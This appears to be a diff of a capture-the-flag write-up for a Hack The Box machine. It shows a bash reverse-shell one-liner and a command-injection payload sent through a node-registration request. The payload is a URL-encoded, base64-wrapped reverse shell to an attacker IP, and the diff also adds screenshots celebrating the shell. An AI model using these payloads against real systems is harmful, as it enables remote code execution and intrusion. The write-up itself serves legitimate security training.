@@ -138,11 +138,7 @@ bash -c 'bash -i >& /dev/tcp/10.10.17.163/4444 0>&1'
 
 
 ```
-
-curl -X POST http://blocksynergy.htb:8080/dashboard/vip/nodes \
-  -H "Cookie: session=YOUR_SESSION" \
-  -d "action=register" \
-  -d "node=http://0.0.0.0:8080/admin/nodes/manage?action=ping_node&target=http%3A%2F%2Fx%3Becho%20YmFzaCAtYyAnYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNy4xNjMvNDQ0NCAwPiYxJw%3D%3D%7Cbase64%20-d%7Cbash%3Ba%400.0.0.0%3A8080%2F"
+http://0.0.0.0:8080/admin/nodes/manage?action=ping_node&target=http%3A%2F%2F10.129.66.1%3Becho%20YmFzaCAtYyAnYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNy4xNjMvNTU1NSAwPiYxJw%3D%3D%7Cbase64%20-d%7Cbash%3Ba%4010.129.66.1%3A8080%2F
 ```
 
 
@@ -151,17 +147,16 @@ curl -X POST http://blocksynergy.htb:8080/dashboard/vip/nodes \
 ## Triggering the Exploit
 
 
-```
-# Triggered all nodes to make sure the exploit runs
-for i in 0 1 2 3; do
-    curl http://blocksynergy.htb:8080/dashboard/vip/nodes/test_node/$i \
-      -H "Cookie: session=YOUR_SESSION"
-done
-```
+<img width="997" height="490" alt="image" src="https://github.com/user-attachments/assets/8d523627-16c3-49d7-805f-8e463383d8a7" />
 
 
 
+---
 
+## Boom got shell 
+
+
+<img width="992" height="208" alt="image" src="https://github.com/user-attachments/assets/2e09da3b-9c12-489d-a439-dbed395d8c33" />
 
 
 
